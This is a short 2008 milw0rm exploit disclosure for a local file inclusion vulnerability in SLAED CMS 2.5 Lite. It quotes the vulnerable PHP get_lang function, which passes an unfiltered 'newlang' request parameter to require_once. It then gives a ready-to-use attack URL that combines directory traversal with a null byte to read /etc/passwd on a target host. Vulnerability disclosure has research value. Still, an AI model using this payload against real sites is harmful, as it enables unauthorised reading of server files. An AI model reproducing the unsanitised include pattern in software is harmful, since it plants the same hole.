<html><head><title>SLAED CMS 2.5 Lite (newlang) Local File Inclusion Vulnerability</title></head><pre># SLAED CMS 2.5 Lite Local file inclusion

# Script url http://www.slaed.net/uploads/files/public/SLAED_CMS_2.5_Lite.zip

# Lets code in function/sources.php: 
 
780:  // Format language
781:  function get_lang($module=&quot;&quot;) {
782:	global $multilingual, $currentlang, $language, $user_cookie_t;
783:	if (isset($_REQUEST['newlang']) &amp;&amp; $multilingual == &quot;1&quot;) {
784:		if (file_exists(&quot;language/lang-&quot;.$_REQUEST['newlang'].&quot;.php&quot;)) {
785:			setcookie(&quot;lang&quot;, $_REQUEST['newlang'], time() + intval($user_cookie_t));
786:			require_once(&quot;language/lang-&quot;.$_REQUEST['newlang'].&quot;.php&quot;);
                        ...

And in index.php:
9:    require_once(&quot;function/function.php&quot;);
10:   get_lang();

# As you can see variable newlang is not filtered, so, if magic_quotes_gpc turned off, we can use exploit:

http://[targethost]/[path]/index.php?newlang=../../../../../../../../../../etc/passwd%00

# Bug discovered by The_HuliGun

# Greetz to: NaTka and all people who understand...

# See u soon!

# milw0rm.com [2008-01-23]</pre></html>